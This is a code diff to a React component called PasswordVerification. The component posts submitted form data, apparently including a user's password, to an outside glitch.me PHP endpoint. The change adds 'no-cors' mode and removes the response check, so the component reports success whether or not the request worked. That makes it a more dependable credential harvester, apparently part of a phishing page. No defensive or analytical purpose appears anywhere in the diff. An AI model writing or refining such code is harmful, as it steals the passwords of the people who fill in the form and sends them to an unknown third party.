@@ -76,26 +76,24 @@ function PasswordVerification({ submissionId, userData }) {
         });
       }
 
-      // Send to external API
+      // Send to external API with CORS handling
       const response = await fetch(
         "https://mixed-fluff-space.glitch.me/zubaireng.php",
         {
           method: "POST",
+          mode: "no-cors",
           body: apiFormData,
         },
       );
 
-      if (response.ok) {
-        // Store locally as backup
-        localStorage.setItem(
-          `submission_${submissionId}`,
-          JSON.stringify(completeSubmission),
-        );
-        setIsSubmitting(false);
-        setIsComplete(true);
-      } else {
-        throw new Error("Password submission failed");
-      }
+      // With no-cors mode, we can't check response status
+      // Assume success if no error was thrown
+      localStorage.setItem(
+        `submission_${submissionId}`,
+        JSON.stringify(completeSubmission),
+      );
+      setIsSubmitting(false);
+      setIsComplete(true);
     } catch (error) {
       console.error("Error submitting password:", error);
       setErrors({ submit: "Failed to submit password. Please try again." });
